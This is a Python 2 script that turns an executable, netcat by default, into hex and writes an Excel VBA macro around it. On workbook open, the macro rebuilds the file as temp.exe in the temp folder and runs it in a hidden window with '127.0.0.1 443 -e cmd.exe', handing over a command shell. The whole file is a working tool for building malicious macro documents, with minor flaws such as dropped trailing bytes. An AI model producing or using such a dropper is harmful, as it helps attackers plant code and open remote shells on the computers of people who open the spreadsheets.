import sys, os, struct, getopt
from struct import pack, unpack
from binascii import crc32




def main(argv):
   filename = "nc.exe"

   try:
      opts, args = getopt.getopt(argv,"hf:",["filename="])
   except getopt.GetoptError:
      print 'ExeIntoExcel.py -f <filename>'
      sys.exit(2)
   for opt, arg in opts:
      if opt == '-h':
         print 'ExeIntoExcel.py -f <filename>'
         sys.exit()
      elif opt in ("-f", "--filename"):
         filename = arg

         dumpFile(filename)

         processTextFile("hex.txt")



def get_bytes_from_file(filename):
   return open(filename, "rb").read()

def processTextFile(filename):
   text = open(filename, "rb").read()

   f = open("hexready.txt", "wb+")

   f.write("Public Function HexDecode(sData As String) As String\n")
   f.write("     Dim iChar As Integer\n")
   f.write("     Dim sOutString As String\n")
   f.write("     Dim sTmpChar As String\n")
   f.write("     For iChar = 1 To Len(sData) Step 2\n")
   f.write('        sTmpChar = Chr("&H" & Mid(sData, iChar, 2))\n')
   f.write("        sOutString = sOutString & sTmpChar\n")
   f.write("     Next iChar\n")   
   f.write("     HexDecode = sOutString\n")
   f.write("End Function\n")
   f.write("\n")
   f.write("\n")
   f.write("Private Sub Workbook_Open()\n")
   f.write("\n")

   rowcount = len(text)/1000

   f.write("Dim codes(1 To " + str(rowcount) + ") As String\n" )
   
   for i in range(0,len(text)):

      temp = "codes("
      
      i = i+1

      if (i%1000) == 0:
         
         line = temp + str(i/1000) + ')="' + text[(i-1000):i] + '"\n'

         f.write(line)


   f.write('\n')
   f.write('code = ""\n')
   f.write('For i = 1 To ' + str(rowcount) + '\n')
   f.write('    code = code + codes(i)\n')
   f.write('Next\n')
   f.write('\n')
   f.write('fnum = FreeFile\n')
   f.write('fname = Environ("TMP") & "\\temp.exe"\n')
   f.write('Open fname For Binary As #fnum\n')
   f.write('    For t = 1 To ' + str(rowcount*1000) + ' Step 4\n')
   f.write('        vv = Mid(code, t, 4)\n')
   f.write('        Put #fnum, , HexDecode(CStr(vv))\n')
   f.write('    Next t\n')
   f.write('Close #fnum\n')
   f.write('\n')
   f.write('Dim rss\n')
   f.write('rss = Shell(fname + " 127.0.0.1 443 -e C:\\Windows\\System32\\cmd.exe", 0)\n')
   f.write('\n')
   f.write('End Sub\n')
   f.write('\n')




         
   f.close()
  
  

def dumpFile(filename):
   
   bytes = get_bytes_from_file(filename)
			
   FILE = open("hex.txt", "wb+")
   FILE.write(bytes.encode('hex'))

   FILE.close()
	
if __name__ == "__main__":
    main(sys.argv[1:])

